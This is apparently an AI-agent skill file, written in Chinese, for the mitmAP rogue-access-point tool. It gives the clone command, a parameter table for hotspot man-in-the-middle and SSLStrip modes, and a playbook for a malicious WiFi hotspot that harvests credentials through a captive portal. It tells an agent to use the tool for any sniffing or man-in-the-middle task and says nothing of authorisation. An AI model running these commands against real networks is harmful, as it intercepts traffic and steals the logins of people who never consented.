---
name: mitmap-ap-mitm
description: 渗透工具 skill:mitmAP 的安装、参数速查与攻击场景 playbook。当任务涉及 嗅探与中间人攻击 需要调用 mitmAP 时使用。
---

# mitmAP

- 攻击大类:C40 嗅探与中间人攻击
- 上游仓库:https://github.com/xdavidhu/mitmAP
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/xdavidhu/mitmAP && cd mitmAP
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python3 mitmAP.py -i wlan0 -t eth0` | 钓鱼热点+中间人 |
| `-i in -t out -p` | SSLStrip |
| `-s` | SSLStrip2 |

## 攻击场景 Playbook

### 恶意热点钓鱼

```bash
python3 mitmAP.py -i wlan0 -t eth0
# 强制门户+凭据收割
```

## 注意事项

恶意 WiFi 热点中间人工具(需无线网卡)。
